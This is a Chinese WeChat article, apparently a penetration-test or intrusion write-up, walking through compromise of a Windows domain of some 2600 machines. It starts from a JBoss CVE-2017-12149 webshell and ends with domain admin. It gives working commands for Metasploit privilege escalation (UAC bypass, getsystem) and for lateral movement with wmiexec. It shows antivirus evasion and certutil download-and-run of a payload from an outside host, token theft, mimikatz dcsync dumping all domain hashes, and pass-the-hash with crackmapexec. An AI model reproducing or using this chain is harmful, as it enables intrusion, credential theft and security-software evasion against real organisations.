<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/DSR6g3UVJQs31Wk6vilfsQ)

**前言**

首先是发现了一个 CVE-2017-12149：

![](https://mmbiz.qpic.cn/mmbiz_png/yYePiaZj2cHibyJSrMiayWWTARicQ4qu1TXzmu0iaOvicO6QBwbBuv0xj0ah2JWBqlVufGmehy8cGq5r48QCib1y6E2uA/640?wx_fmt=png)

访问 http://inbug.org:9090/status 发现有日志，已经被上传了 webshell：  

![](https://mmbiz.qpic.cn/mmbiz_png/yYePiaZj2cHibyJSrMiayWWTARicQ4qu1TXz6O5fyAgJu6nxZKibPVJbomv4LjjkAbOx0AX25I9qb1UfqE0UDqvnY4g/640?wx_fmt=png)

那么就用别人的把：http://inbug.org:9090/jexws4/jexws4.jsp?ppp=whoami

![](https://mmbiz.qpic.cn/mmbiz_png/yYePiaZj2cHibyJSrMiayWWTARicQ4qu1TXzDHGjrqT5u9tvoLicMibbhtOohLEJNaVWR21wUWRLtfe3HWicbdwjtt9SQ/640?wx_fmt=png)

通过 powershell 上线到 Cs：

![](https://mmbiz.qpic.cn/mmbiz_png/yYePiaZj2cHibyJSrMiayWWTARicQ4qu1TXzfsbnue1tsAl6ia8tSTxcoHCTLnY31ibfqZI2NIRZamvOjpr1nhZ5Xlaw/640?wx_fmt=png)

发现有几百个补丁提权无果：

![](https://mmbiz.qpic.cn/mmbiz_png/yYePiaZj2cHibyJSrMiayWWTARicQ4qu1TXzN3nIoWvCOiavLAbl5XNCCiajkT4Xhj6rJpMibGib6omzicD3DL5X37TowDg/640?wx_fmt=png)

**Metasploit 特权提权**

随后把 CS 的 Beacon 互传到了 MSF：

```
MSF：
use exploit/multi/handler
set payload windows/meterpreter/reverse_http

CS：
创建监听器windows/foreign/reverse_http
执行监听器 spawn msf
```

![](https://mmbiz.qpic.cn/mmbiz_png/yYePiaZj2cHibyJSrMiayWWTARicQ4qu1TXzWgAzBNoWf7cu9O2wgvG3kQ4CIwUQOdFEt03vpPMbXgdYbfJdxKQuRQ/640?wx_fmt=png)

然后通过 MSF 的提权检测找到了几个 exp ：

```
run post/multi/recon/local_exploit_suggester
```

![](https://mmbiz.qpic.cn/mmbiz_png/yYePiaZj2cHibyJSrMiayWWTARicQ4qu1TXzY0eJzKsbNZdYjqiaNZJ1RCcpdooGyibc8yf6PtVDP8GASibO7nyAaNbYg/640?wx_fmt=png)

然后利用模块尝试提权：

```
exploit/windows/local/bypassuac_sdclt
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/yYePiaZj2cHibyJSrMiayWWTARicQ4qu1TXz7dKGlebfevV3gNksQR4e9cYThIt1eFzgwcicfPYnzAXxSXfSv954V0Q/640?wx_fmt=jpeg)

发现用户身份没变，但是当前特权变了：

![](https://mmbiz.qpic.cn/mmbiz_png/yYePiaZj2cHibyJSrMiayWWTARicQ4qu1TXzpUw3qT3GXbIcNagp9WMp3qCTbOBAhmtHHe0db8n9icSzEAwNfc3EbnA/640?wx_fmt=png)

直接 getsystem 提权到 SYSTEM：  

![](https://mmbiz.qpic.cn/mmbiz_png/yYePiaZj2cHibyJSrMiayWWTARicQ4qu1TXz3ZIov84lD0M5hk0re4tfEEfXyZ1wAHIZOpprnqxMF5punIynvmLYicw/640?wx_fmt=png)

最后利用 SYSYEM 把 shell 传到 Cs：

```
MSF:
background
use exploit/windows/local/payload_inject
set payload windows/meterpreter/reverse_http
set session 3
run

CS:
windows/beacon_http/reverse_http
```

![](https://mmbiz.qpic.cn/mmbiz_png/yYePiaZj2cHibyJSrMiayWWTARicQ4qu1TXzBKauTkIgiaibPa6ibA4dhmaamAZuIslOxFxzODic5RnFy7TEIWOeiaehmRw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/yYePiaZj2cHibyJSrMiayWWTARicQ4qu1TXzgc62p6CGVjpoccVZW029uqaNiabFMqeo87HeoZichHOHhauo3feMX7jA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/yYePiaZj2cHibyJSrMiayWWTARicQ4qu1TXzRta165s2MREgBDxrtZaa0AdwRJiaiaF67fmCnpXvCWqm7pMUib9wBaFqA/640?wx_fmt=png)

当前权限就可以抓密码了：

![](https://mmbiz.qpic.cn/mmbiz_png/yYePiaZj2cHibyJSrMiayWWTARicQ4qu1TXzNndjF0MzpIibnI1uur0g8XhzMOJeR2SiaRibdFhxJGEEv2BZacALGh8Tg/640?wx_fmt=png)

既然当前 beacon 不是 SYSYEM，而且有了本地管理员的账号 hash 和明文 ，直接本地 psexec 利用本地 administrator 的密码上线：

![](https://mmbiz.qpic.cn/mmbiz_png/yYePiaZj2cHibyJSrMiayWWTARicQ4qu1TXzialmXtoraDA6kAWD0etXKjgoN1FOx35Ur4swC9rJFJM7D2cZT7iaTo2Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/yYePiaZj2cHibyJSrMiayWWTARicQ4qu1TXzY3IP1hiaBUSaLxVueQFhXfibs6uFL0Qftr09e9Cc6icxfwlrDpOeYVBzg/640?wx_fmt=png)

**内网横向移动**

这个时候发现就是一个 SYSTEM 的 Beacon 会话了！但是发现没有域管的进程，结果只能另寻他路！然后用抓到的密码去喷射域内其他主机：

![](https://mmbiz.qpic.cn/mmbiz_png/yYePiaZj2cHibyJSrMiayWWTARicQ4qu1TXzgZ2UMOKunDwxVfia1Licjaqg5GUMibtb069BACPZRQulmIXgWRtmwCuvA/640?wx_fmt=png)

然后可以横向 wmi：

```
 proxychains python3 wmiexec.py -shell-type cmd administrator:password@10.226.0.108 -codec gbk
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/yYePiaZj2cHibyJSrMiayWWTARicQ4qu1TXz3vXAjXltqz101icBiawOObASzDDf5ictCAOiaAgS36J5ArzXfpV0yc3RIw/640?wx_fmt=jpeg)

**Bypass 诺顿 AV 上线到 CobaltStrike**

之后发现 10.226.0.156 有一个域管的进程：tasklist /v  

![](https://mmbiz.qpic.cn/mmbiz_jpg/yYePiaZj2cHibyJSrMiayWWTARicQ4qu1TXzr3r5O0r6dM1CGQK56ciaQpRCql04Qdvg3xggSMiaqPlfK3ybjJjM9RLw/640?wx_fmt=jpeg)

然后还有诺顿 AV：

![](https://mmbiz.qpic.cn/mmbiz_png/yYePiaZj2cHibyJSrMiayWWTARicQ4qu1TXzbZic46w5X82vjZxapicuicmk569l2emp4u49dPTsibb7Dn0QfGEze9hdug/640?wx_fmt=png)

使用 InScan 的 ShllCode 免杀功能 做了一下免杀

![](https://mmbiz.qpic.cn/mmbiz_png/yYePiaZj2cHiblPLeOeKFxklcHEoMAoLTjg6HwUmOHlBjBER7O2J2c2Xrzzib06VAp7R6Zz1XAEdU5sKTAlgNLsFA/640?wx_fmt=png)

然后让目标下载我们的 exe，通过 certutil 下载我们的 exe：  

```
certutil.exe -urlcache -split -f http://inbug.org:80/download/main.exe
```

![](https://mmbiz.qpic.cn/mmbiz_png/yYePiaZj2cHibyJSrMiayWWTARicQ4qu1TXztrUp2jkaiaxddfzEFYzGgJhVqu4eBW87GtslQNYlcicbdAcAc3lRyBQg/640?wx_fmt=png)

然后运行发现有问题：

![](https://mmbiz.qpic.cn/mmbiz_jpg/yYePiaZj2cHibyJSrMiayWWTARicQ4qu1TXzGfxksibNmEEicDpT8WSxsMsVXk5liaHgpO4cXOGicZpBPF6dIRuicYweQ7g/640?wx_fmt=jpeg)

exe 编码成 txt：

```
certutil -encode main.exe main.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/yYePiaZj2cHibyJSrMiayWWTARicQ4qu1TXzpuT4DnMpnCJNibLMjF0E2lQddZZNUOtoZiaW85eESCPln6oDYUlJKnZw/640?wx_fmt=png)

然后目标下载 txt  然后解码再运行：

```
certutil.exe -urlcache -split -f http://inbug.org:80/download/main.txt

certutil -decode main.txt main.exe
```

直接上线到 Cs：

![](https://mmbiz.qpic.cn/mmbiz_png/yYePiaZj2cHibyJSrMiayWWTARicQ4qu1TXzNnSeMXwDEgDanjATyuhviccfoa7jKA7G9T9k2Bqo8wicM8SAKvk3IQkQ/640?wx_fmt=png)

先 getsystem 提权到 SYSYEM：

![](https://mmbiz.qpic.cn/mmbiz_png/yYePiaZj2cHibyJSrMiayWWTARicQ4qu1TXzZHviay0w1yyZomTTTT6TaIy3AgVV7YpfcwWAstBia7rpW3j2Wr5hbH6A/640?wx_fmt=png)

**令牌窃取拿到域管**

窃取域管的进程：

![](https://mmbiz.qpic.cn/mmbiz_png/yYePiaZj2cHibyJSrMiayWWTARicQ4qu1TXzILNovVJiczJIs7EI7d9Hb1Hcqm5OQrAQibVrsLVK1icuTVHjpNtNe4Z7Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/yYePiaZj2cHibyJSrMiayWWTARicQ4qu1TXzWyY4WQ4C1icsiaLlUaeLxZsRW4oiaDnxEx0ibrs2VicAEeO2gQNVRcvPCaw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/yYePiaZj2cHibyJSrMiayWWTARicQ4qu1TXzQC6np7bSeBdVFGEj1TfDH64vDlibmgw2ojtIyhqX6AaSOv1Y41s8DlA/640?wx_fmt=png)

随后查询域控 IP：

```
beacon> shell net group "Domain Controllers" /domain
[*] Tasked beacon to run: net group "Domain Controllers" /domain
[+] host called home, sent: 69 bytes
[+] received output:
The request will be processed at a domain controller for domain inbug.org.

Group name     Domain Controllers
Comment        All domain controllers in the domain

Members

-------------------------------------------------------------------------------
xxADC01$   192.168.101.4    
xxxxN024$ 192.168.0.20      
xxxGN042$ 192.168.0.154               
xxxGN043$ 192.168.0.19
xxxGN052$   192.168.0.14             
xxxGN053$    192.168.0.31            
xxSERVER1$   10.226.0.150
xxPSERVER116$  10.225.241.149          
xxSERVER400$  192.168.105.5           
xxSERVER401$  192.168.105.6        
xxSERVER505$   10.231.1.15        
xxSERVER506$    10.232.55.60         
xxSERVER600$    10.227.69.108 
xxSERVER813$    10.225.240.16         
The command completed successfully.
```

![](https://mmbiz.qpic.cn/mmbiz_png/yYePiaZj2cHibyJSrMiayWWTARicQ4qu1TXzxUWuMuMkHQQIicYtJzsvFKyqD3LTB9MVWlOhhyPub9AqIRNeD5xXbPg/640?wx_fmt=png)

最后直接 dcsync dump 域内全部 hash：

```
mimikatz lsadump::dcsync /domain:psnet.com /all /csv
```

![](https://mmbiz.qpic.cn/mmbiz_png/yYePiaZj2cHibyJSrMiayWWTARicQ4qu1TXzpeV7dQQaepzd3pV5z6Hic1ejPznib9yWUENtKBlEsOcnPaPpZy7cnuXQ/640?wx_fmt=png)

5000 多个域用户的 hash 都拿到了，可以进行 pth，随后只要 administrator 的 hash，就可以指定：

```
mimikatz lsadump::dcsync /domain:inbug.org /user:Administrator
```

![](https://mmbiz.qpic.cn/mmbiz_png/yYePiaZj2cHibyJSrMiayWWTARicQ4qu1TXzyBvlh32Bj2b4E4Vt6rodzrrSJRxOia9fDUTvSbUI2QUoKdDEZlosnPw/640?wx_fmt=png)

此时利用 ntlm hash 批量 pth 执行命令：

```
proxychains crackmapexec smb 192.168.0.0/24 -u administrator -H 4a03985f63e4dxxxxxxx -d inbug.org -x "net user"
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/yYePiaZj2cHibyJSrMiayWWTARicQ4qu1TXzUCAl0ZDp79HojI2A3T6aAoWc2YRSkpLX0zM16IdDMYgO0WEvbHhR9g/640?wx_fmt=jpeg)

此时游戏已经结束了！查看了一下域内进行信息；

```
execute-assembly /Users/saulgoodman/Downloads/SharpHound.exe -c all
```

![](https://mmbiz.qpic.cn/mmbiz_png/yYePiaZj2cHibyJSrMiayWWTARicQ4qu1TXzrn6UODYaqdcbibAswSaptxwPiciakxmEdRvBUBicenzh53aAlnsnqoANAg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/yYePiaZj2cHibyJSrMiayWWTARicQ4qu1TXzQXIrklGagsPqEWark2KhE5YvHkbpkrFsho1GZSNb2qdWT4oGiaz3chQ/640?wx_fmt=jpeg)

好家伙，2600 多机器，5000 多个用户，就到这吧。  

公众号